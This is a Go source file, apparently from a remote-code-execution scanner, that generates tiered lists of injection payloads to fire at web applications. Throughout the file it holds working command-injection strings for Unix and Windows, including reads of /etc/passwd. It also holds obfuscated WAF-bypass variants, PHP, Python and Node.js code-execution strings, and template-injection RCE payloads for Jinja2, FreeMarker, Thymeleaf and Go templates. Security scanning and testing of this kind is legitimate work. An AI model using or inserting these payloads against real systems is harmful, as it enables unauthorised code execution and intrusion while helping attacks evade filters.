package payload

import (
	"strings"

	"github.com/hbzw/RCE_HawkEye_go/internal/types"
)

type AdvancedGenerator struct {
	baseGenerator *PayloadGenerator
	encoder       *Encoder
}

func NewAdvancedGenerator() *AdvancedGenerator {
	return &AdvancedGenerator{
		baseGenerator: NewPayloadGenerator(),
		encoder:       NewEncoder(),
	}
}

func (ag *AdvancedGenerator) GetSmartPayloads(tech types.TechType, osType types.OSType, level types.ScanLevel) []types.Payload {
	var payloads []types.Payload

	switch level {
	case types.ScanLevelQuick:
		payloads = ag.getQuickPayloads(tech, osType)
	case types.ScanLevelNormal:
		payloads = ag.getNormalPayloads(tech, osType)
	case types.ScanLevelDeep:
		payloads = ag.getDeepPayloads(tech, osType)
	case types.ScanLevelExhaustive:
		payloads = ag.getExhaustivePayloads(tech, osType)
	}

	return payloads
}

func (ag *AdvancedGenerator) getQuickPayloads(tech types.TechType, osType types.OSType) []types.Payload {
	var payloads []types.Payload

	payloads = append(payloads, types.Payload{
		Content:       "; id;",
		PayloadType:   types.PayloadTypeEchoBased,
		OSType:        types.OSTypeUnix,
		Description:   "Unix id命令",
		ExpectedOutput: "uid=",
	})

	payloads = append(payloads, types.Payload{
		Content:       "& whoami",
		PayloadType:   types.PayloadTypeEchoBased,
		OSType:        types.OSTypeWindows,
		Description:   "Windows whoami命令",
	})

	payloads = append(payloads, types.Payload{
		Content:        "; sleep 3;",
		PayloadType:    types.PayloadTypeTimeBased,
		OSType:         types.OSTypeUnix,
		Description:    "Unix sleep时间盲注",
		ExpectedDelay:  3,
	})

	payloads = append(payloads, types.Payload{
		Content:        "& timeout 3",
		PayloadType:    types.PayloadTypeTimeBased,
		OSType:         types.OSTypeWindows,
		Description:    "Windows timeout时间盲注",
		ExpectedDelay:  3,
	})

	if tech == types.TechTypePHP {
		payloads = append(payloads, types.Payload{
			Content:        "system('id');",
			PayloadType:    types.PayloadTypeCodeExec,
			OSType:         types.OSTypeBoth,
			Description:    "PHP system函数",
			TechType:       types.TechTypePHP,
			ExpectedOutput: "uid=",
		})
	}

	return payloads
}

func (ag *AdvancedGenerator) getNormalPayloads(tech types.TechType, osType types.OSType) []types.Payload {
	payloads := ag.getQuickPayloads(tech, osType)

	payloads = append(payloads, types.Payload{
		Content:       "| id",
		PayloadType:   types.PayloadTypeEchoBased,
		OSType:        types.OSTypeUnix,
		Description:   "Unix管道符id",
		ExpectedOutput: "uid=",
	})

	payloads = append(payloads, types.Payload{
		Content:       "&& id",
		PayloadType:   types.PayloadTypeEchoBased,
		OSType:        types.OSTypeUnix,
		Description:   "Unix AND连接id",
		ExpectedOutput: "uid=",
	})

	payloads = append(payloads, types.Payload{
		Content:       "`id`",
		PayloadType:   types.PayloadTypeEchoBased,
		OSType:        types.OSTypeUnix,
		Description:   "Unix反引号id",
		ExpectedOutput: "uid=",
	})

	payloads = append(payloads, types.Payload{
		Content:       "$(id)",
		PayloadType:   types.PayloadTypeEchoBased,
		OSType:        types.OSTypeUnix,
		Description:   "Unix $()执行id",
		ExpectedOutput: "uid=",
	})

	payloads = append(payloads, types.Payload{
		Content:       "| whoami",
		PayloadType:   types.PayloadTypeEchoBased,
		OSType:        types.OSTypeWindows,
		Description:   "Windows管道符whoami",
	})

	payloads = append(payloads, types.Payload{
		Content:       "&& whoami",
		PayloadType:   types.PayloadTypeEchoBased,
		OSType:        types.OSTypeWindows,
		Description:   "Windows AND连接whoami",
	})

	payloads = append(payloads, types.Payload{
		Content:       "; cat /etc/passwd;",
		PayloadType:   types.PayloadTypeEchoBased,
		OSType:        types.OSTypeUnix,
		Description:   "读取passwd文件",
		ExpectedOutput: "root:",
	})

	payloads = append(payloads, types.Payload{
		Content:       "; ls -la;",
		PayloadType:   types.PayloadTypeEchoBased,
		OSType:        types.OSTypeUnix,
		Description:   "列出目录",
		ExpectedOutput: "total",
	})

	payloads = append(payloads, types.Payload{
		Content:        "| sleep 3",
		PayloadType:    types.PayloadTypeTimeBased,
		OSType:         types.OSTypeUnix,
		Description:    "管道符sleep",
		ExpectedDelay:  3,
	})

	payloads = append(payloads, types.Payload{
		Content:        "| ping -n 3 127.0.0.1",
		PayloadType:    types.PayloadTypeTimeBased,
		OSType:         types.OSTypeWindows,
		Description:    "Windows ping延迟",
		ExpectedDelay:  3,
	})

	if tech == types.TechTypePHP {
		phpPayloads := []types.Payload{
			{Content: "shell_exec('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP shell_exec", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
			{Content: "passthru('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP passthru", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
			{Content: "exec('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP exec", TechType: types.TechTypePHP},
			{Content: "`id`", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP反引号", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		}
		payloads = append(payloads, phpPayloads...)
	}

	if tech == types.TechTypeJSPJava {
		jspPayloads := []types.Payload{
			{Content: "<%Runtime.getRuntime().exec(\"id\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP Runtime.exec", TechType: types.TechTypeJSPJava},
			{Content: "#{Runtime.getRuntime().exec('id')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "EL表达式执行", TechType: types.TechTypeJSPJava},
		}
		payloads = append(payloads, jspPayloads...)
	}

	if tech == types.TechTypePython {
		pyPayloads := []types.Payload{
			{Content: "__import__('os').system('id')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python os.system", TechType: types.TechTypePython, ExpectedOutput: "uid="},
			{Content: "__import__('os').popen('id').read()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python os.popen", TechType: types.TechTypePython, ExpectedOutput: "uid="},
		}
		payloads = append(payloads, pyPayloads...)
	}

	if tech == types.TechTypeNodeJS {
		nodePayloads := []types.Payload{
			{Content: "require('child_process').execSync('id').toString()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js execSync", TechType: types.TechTypeNodeJS, ExpectedOutput: "uid="},
			{Content: "require('child_process').exec('id')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js exec", TechType: types.TechTypeNodeJS},
		}
		payloads = append(payloads, nodePayloads...)
	}

	return payloads
}

func (ag *AdvancedGenerator) getDeepPayloads(tech types.TechType, osType types.OSType) []types.Payload {
	payloads := ag.getNormalPayloads(tech, osType)

	payloads = append(payloads, ag.getAdvancedUnixPayloads()...)
	payloads = append(payloads, ag.getAdvancedWindowsPayloads()...)
	payloads = append(payloads, ag.getWAFBypassPayloads(osType)...)

	if tech == types.TechTypePHP {
		payloads = append(payloads, ag.getAdvancedPHPPayloads()...)
	}

	if tech == types.TechTypeTemplate {
		payloads = append(payloads, ag.getTemplateInjectionPayloads()...)
	}

	return payloads
}

func (ag *AdvancedGenerator) getExhaustivePayloads(tech types.TechType, osType types.OSType) []types.Payload {
	payloads := ag.getDeepPayloads(tech, osType)

	payloads = append(payloads, ag.getEncodedPayloads(osType)...)
	payloads = append(payloads, ag.getPolyglotPayloads()...)
	payloads = append(payloads, ag.getEdgeCasePayloads()...)

	return payloads
}

func (ag *AdvancedGenerator) getAdvancedUnixPayloads() []types.Payload {
	return []types.Payload{
		{Content: "; {id};", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "大括号执行", ExpectedOutput: "uid="},
		{Content: "; i''d;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "引号分割绕过", ExpectedOutput: "uid="},
		{Content: "; i\\d;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "反斜杠绕过", ExpectedOutput: "uid="},
		{Content: "; i${PATH:0:0}d;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "变量切片绕过", ExpectedOutput: "uid="},
		{Content: "; i${IFS}d;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "IFS变量绕过", ExpectedOutput: "uid="},
		{Content: "%0aid", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "换行符URL编码", ExpectedOutput: "uid="},
		{Content: "; /???/??t /???/p??s??;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "通配符cat passwd", ExpectedOutput: "root:"},
		{Content: "; c'a't /e'tc'/p'a'sswd;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "引号分割cat", ExpectedOutput: "root:"},
		{Content: "; {cat,/etc/passwd};", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "大括号参数", ExpectedOutput: "root:"},
		{Content: ";$(printf '\\x69\\x64');", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "printf十六进制id", ExpectedOutput: "uid="},
		{Content: ";$(echo'aWQ='|base64 -d);", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "base64解码执行", ExpectedOutput: "uid="},
		{Content: "; awk 'BEGIN{system(\"id\")}';", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "awk执行", ExpectedOutput: "uid="},
		{Content: "; find / -exec id \\;;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "find exec执行", ExpectedOutput: "uid="},
		{Content: "; xargs id <<< '';", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "xargs执行", ExpectedOutput: "uid="},
	}
}

func (ag *AdvancedGenerator) getAdvancedWindowsPayloads() []types.Payload {
	return []types.Payload{
		{Content: "& w^hoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "脱字符绕过"},
		{Content: "& w\"\"hoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "双引号绕过"},
		{Content: "& who''ami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "单引号绕过"},
		{Content: "& %COMSPEC% /c whoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "COMSPEC变量"},
		{Content: "& cmd /c \"set p=whoami&&call %%p%%\"", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "变量执行"},
		{Content: "& powershell -enc dwBoAG8AYQBtAGkA", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "PowerShell Base64"},
		{Content: "& for /f \"delims=\" %a in ('whoami') do %a", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "for循环执行"},
		{Content: "& w^^hoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "双重脱字符"},
		{Content: "& c^m^d /c whoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "cmd脱字符"},
	}
}

func (ag *AdvancedGenerator) getWAFBypassPayloads(osType types.OSType) []types.Payload {
	var payloads []types.Payload

	if osType == types.OSTypeUnix || osType == types.OSTypeBoth {
		payloads = append(payloads, []types.Payload{
			{Content: ";$IFS'id';", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "IFS空格绕过", ExpectedOutput: "uid="},
			{Content: ";{id,};", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "大括号扩展", ExpectedOutput: "uid="},
			{Content: ";id%00;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "空字节截断"},
			{Content: ";id%09;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Tab字符"},
			{Content: ";\nid;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "换行执行", ExpectedOutput: "uid="},
			{Content: ";\rid;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "回车执行", ExpectedOutput: "uid="},
		}...)
	}

	if osType == types.OSTypeWindows || osType == types.OSTypeBoth {
		payloads = append(payloads, []types.Payload{
			{Content: "&who%0dami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "回车绕过"},
			{Content: "&who%0aami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "换行绕过"},
		}...)
	}

	return payloads
}

func (ag *AdvancedGenerator) getAdvancedPHPPayloads() []types.Payload {
	return []types.Payload{
		{Content: "sYsTeM('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP大小写混合", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "sys/**/tem('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP注释分割", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "(system)('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP括号包裹", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "$a='sys';$b='tem';$a.$b('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP字符串拼接", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "define('x','system');x('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP动态函数", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "$_GET[0]($_GET[1]);&0=system&1=id", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP变量函数", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "array_map('system',array('id'));", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP array_map", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "array_filter(array('id'),'system');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP array_filter", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "usort(array('id'),'system');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP usort", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "ob_start('system');echo 'id';ob_end_flush();", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP ob_start", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "var_dump(`id`);", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP反引号var_dump", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "print `id`;", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP反引号print", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "die(`id`);", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP反引号die", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "assert('system(\"id\")');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP assert执行", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "create_function('','system(\"id\");')();", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP create_function", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "preg_replace('/.*/e','system(\"id\")','');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP preg_replace /e", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
		{Content: "pcntl_exec('/bin/sh',array('-c','id'));", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP pcntl_exec", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
	}
}

func (ag *AdvancedGenerator) getTemplateInjectionPayloads() []types.Payload {
	return []types.Payload{
		{Content: "{{7*7}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI Jinja2基础测试", TechType: types.TechTypeTemplate, ExpectedOutput: "49"},
		{Content: "${7*7}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI FreeMarker基础测试", TechType: types.TechTypeTemplate, ExpectedOutput: "49"},
		{Content: "#{7*7}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI Ruby ERB测试", TechType: types.TechTypeTemplate, ExpectedOutput: "49"},
		{Content: "{{7*'7'}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI Jinja2类型测试", TechType: types.TechTypeTemplate, ExpectedOutput: "7777777"},
		{Content: "{{config}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI Flask config", TechType: types.TechTypeTemplate},
		{Content: "{{request}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI Flask request", TechType: types.TechTypeTemplate},
		{Content: "{{self.__class__.__mro__}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI Python MRO", TechType: types.TechTypeTemplate},
		{Content: "{{''.__class__.__mro__[2].__subclasses__()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI Python子类", TechType: types.TechTypeTemplate},
		{Content: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "SSTI文件读取", TechType: types.TechTypeTemplate, ExpectedOutput: "root:"},
		{Content: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI RCE", TechType: types.TechTypeTemplate, ExpectedOutput: "uid="},
		{Content: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI FreeMarker RCE", TechType: types.TechTypeTemplate, ExpectedOutput: "uid="},
		{Content: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI FreeMarker assign", TechType: types.TechTypeTemplate, ExpectedOutput: "uid="},
		{Content: "${T(java.lang.Runtime).getRuntime().exec('id')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI Thymeleaf RCE", TechType: types.TechTypeTemplate},
		{Content: "#{T(java.lang.Runtime).getRuntime().exec('id')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI Spring EL RCE", TechType: types.TechTypeTemplate},
		{Content: "{{with $x := \"printf \\\"id\\\" | sh\"}}{{$x}}{{end}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "SSTI Go template", TechType: types.TechTypeTemplate, ExpectedOutput: "uid="},
	}
}

func (ag *AdvancedGenerator) getEncodedPayloads(osType types.OSType) []types.Payload {
	var payloads []types.Payload

	basicPayloads := []string{"; id;", "& whoami", "; cat /etc/passwd;", "system('id');"}
	for _, p := range basicPayloads {
		variants := ag.encoder.GenerateAllVariants(p, osType)
		for i, v := range variants {
			if i == 0 {
				continue
			}
			payloads = append(payloads, types.Payload{
				Content:      v,
				PayloadType:  types.PayloadTypeEchoBased,
				OSType:       osType,
				Description:  "编码变体",
			})
		}
	}

	return payloads
}

func (ag *AdvancedGenerator) getPolyglotPayloads() []types.Payload {
	return []types.Payload{
		{Content: ";id;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "多语言payload - Unix", ExpectedOutput: "uid="},
		{Content: "|id|", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "管道符多语言", ExpectedOutput: "uid="},
		{Content: "$(id)", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "命令替换多语言", ExpectedOutput: "uid="},
		{Content: "`id`", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "反引号多语言", ExpectedOutput: "uid="},
		{Content: "{id}", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "大括号多语言", ExpectedOutput: "uid="},
		{Content: "||id;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "OR连接多语言", ExpectedOutput: "uid="},
		{Content: "&&id;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "AND连接多语言", ExpectedOutput: "uid="},
		{Content: "%0aid%0a", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "换行符多语言", ExpectedOutput: "uid="},
	}
}

func (ag *AdvancedGenerator) getEdgeCasePayloads() []types.Payload {
	return []types.Payload{
		{Content: ";;;;id;;;;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "多重分隔符", ExpectedOutput: "uid="},
		{Content: "    ;id;    ", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "空格填充", ExpectedOutput: "uid="},
		{Content: ";id;#", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "注释截断", ExpectedOutput: "uid="},
		{Content: ";id;//", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "双斜杠注释", ExpectedOutput: "uid="},
		{Content: ";id%00", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "空字节截断"},
		{Content: "';id;'", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "单引号包裹", ExpectedOutput: "uid="},
		{Content: "\";id;\"", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "双引号包裹", ExpectedOutput: "uid="},
		{Content: "');id;//", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "SQL上下文", ExpectedOutput: "uid="},
		{Content: "\");id;//", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "SQL双引号上下文", ExpectedOutput: "uid="},
		{Content: "</script><script>id</script>", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeBoth, Description: "HTML上下文"},
	}
}

func (ag *AdvancedGenerator) GetPayloadsByContext(context string, osType types.OSType) []types.Payload {
	switch context {
	case "url_param":
		return ag.getURLParamPayloads(osType)
	case "header":
		return ag.getHeaderPayloads(osType)
	case "post_data":
		return ag.getPostDataPayloads(osType)
	case "cookie":
		return ag.getCookiePayloads(osType)
	case "json":
		return ag.getJSONPayloads(osType)
	default:
		return ag.GetSmartPayloads(types.TechTypeUnknown, osType, types.ScanLevelNormal)
	}
}

func (ag *AdvancedGenerator) getURLParamPayloads(osType types.OSType) []types.Payload {
	payloads := ag.GetSmartPayloads(types.TechTypeUnknown, osType, types.ScanLevelNormal)

	for i, p := range payloads {
		if strings.Contains(p.Content, ";") || strings.Contains(p.Content, "&") {
			payloads[i].Content = ag.encoder.URLEncode(p.Content)
		}
	}

	return payloads
}

func (ag *AdvancedGenerator) getHeaderPayloads(osType types.OSType) []types.Payload {
	return []types.Payload{
		{Content: "; id;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Header注入Unix", ExpectedOutput: "uid="},
		{Content: "& whoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "Header注入Windows"},
		{Content: "$(id)", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Header命令替换", ExpectedOutput: "uid="},
		{Content: "`id`", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Header反引号", ExpectedOutput: "uid="},
	}
}

func (ag *AdvancedGenerator) getPostDataPayloads(osType types.OSType) []types.Payload {
	return ag.GetSmartPayloads(types.TechTypeUnknown, osType, types.ScanLevelNormal)
}

func (ag *AdvancedGenerator) getCookiePayloads(osType types.OSType) []types.Payload {
	return []types.Payload{
		{Content: "'; id;'", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Cookie注入", ExpectedOutput: "uid="},
		{Content: "\"; id;\"", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Cookie双引号注入", ExpectedOutput: "uid="},
	}
}

func (ag *AdvancedGenerator) getJSONPayloads(osType types.OSType) []types.Payload {
	return []types.Payload{
		{Content: "\"; id;\"", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "JSON注入", ExpectedOutput: "uid="},
		{Content: "\\\"; id; \\\"", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "JSON转义注入", ExpectedOutput: "uid="},
	}
}

func (ag *AdvancedGenerator) GetStatistics() map[string]interface{} {
	return map[string]interface{}{
		"quick_payloads":      len(ag.getQuickPayloads(types.TechTypeUnknown, types.OSTypeBoth)),
		"normal_payloads":     len(ag.getNormalPayloads(types.TechTypeUnknown, types.OSTypeBoth)),
		"deep_payloads":       len(ag.getDeepPayloads(types.TechTypeUnknown, types.OSTypeBoth)),
		"exhaustive_payloads": len(ag.getExhaustivePayloads(types.TechTypeUnknown, types.OSTypeBoth)),
		"unix_advanced":       len(ag.getAdvancedUnixPayloads()),
		"windows_advanced":    len(ag.getAdvancedWindowsPayloads()),
		"php_advanced":        len(ag.getAdvancedPHPPayloads()),
		"template_injection":  len(ag.getTemplateInjectionPayloads()),
		"polyglot":            len(ag.getPolyglotPayloads()),
		"edge_cases":          len(ag.getEdgeCasePayloads()),
	}
}
